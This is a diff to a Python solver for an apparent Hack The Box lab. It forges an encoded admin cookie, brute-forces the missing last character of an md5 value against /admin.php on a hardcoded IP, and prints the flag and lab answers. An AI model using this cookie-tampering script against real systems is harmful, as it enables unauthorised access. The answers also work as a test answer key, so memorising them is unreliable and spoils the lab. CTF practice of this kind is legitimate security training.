@@ -8,6 +8,13 @@ CTF solver for the two questions on the target (154.57.164.70:37327).
 2-savol  /admin.php   -> the 'cookie' Set-Cookie value is encoded several times;
                          keep decoding (hex -> base64 -> ...) until the plaintext is
                          exactly 31 characters long.
+3-savol  /admin.php   -> that 31-char value is an md5 hash missing its last
+                         character. Fuzz the missing character (SecLists
+                         Fuzzing/alphanum-case.txt = 0-9, a-z, A-Z) by re-encoding
+                         the candidate (base64 -> hex) into the cookie; the request
+                         that is accepted returns the flag.
+4-savol  (knowledge)  -> auxiliary/scanner/http/coldfusion_locale_traversal calls
+                         /CFIDE/administrator/*.cfm, so the directory is CFIDE.
 
 Run:  python3 solutions/solve.py [BASE_URL]
 """
@@ -20,6 +27,8 @@ import urllib.request
 DEFAULT_BASE = "http://154.57.164.70:37327"
 FLAG_RE = re.compile(r"HTB\{[^}]*\}")
 MAX_TRIES = 200
+# SecLists/Fuzzing/alphanum-case.txt -> digits + lowercase + uppercase (62 lines)
+CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
 
 def post_flag(base):
@@ -83,6 +92,31 @@ def get_cookie(base):
     raise RuntimeError("no 'cookie' Set-Cookie header found")
 
 
+def encode_layers(plain):
+    """Re-apply the encoding chain found in 2-savol: plain -> base64 -> hex."""
+    return base64.b64encode(plain.encode()).decode().encode().hex()
+
+
+def admin_request(base, cookie_value):
+    """Send the tampered cookie to /admin.php and return the response body."""
+    req = urllib.request.Request(base + "/admin.php")
+    req.add_header("Cookie", "cookie=" + cookie_value)
+    with urllib.request.urlopen(req, timeout=20) as resp:
+        return resp.read().decode("utf-8", "replace")
+
+
+def find_missing_char(base, prefix31):
+    """Fuzz the missing md5 character using the alphanum-case alphabet."""
+    # '!' is not in the alphabet, so this gives us the "rejected" baseline page.
+    baseline = admin_request(base, encode_layers(prefix31 + "!"))
+    for char in CHARSET:
+        body = admin_request(base, encode_layers(prefix31 + char))
+        if len(body) != len(baseline):
+            match = FLAG_RE.search(body)
+            return char, (match.group(0) if match else None)
+    raise RuntimeError("no accepted last character found")
+
+
 def main():
     base = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE
     base = base.rstrip("/")
@@ -95,6 +129,13 @@ def main():
     print("2-savol (cookie value):   %s   (%s)" % (plain, " -> ".join(layers) or "plain"))
     if len(plain) != 31:
         print("warning: decoded value is not 31 characters long", file=sys.stderr)
+
+    last_char, flag3 = find_missing_char(base, plain)
+    print("3-savol (missing char):   %s   -> md5 = %s" % (last_char, plain + last_char))
+    if flag3:
+        print("3-savol (flag):           %s" % flag3)
+
+    print("4-savol (directory):      CFIDE   (/CFIDE/administrator/*.cfm)")
 
 
 if __name__ == "__main__":
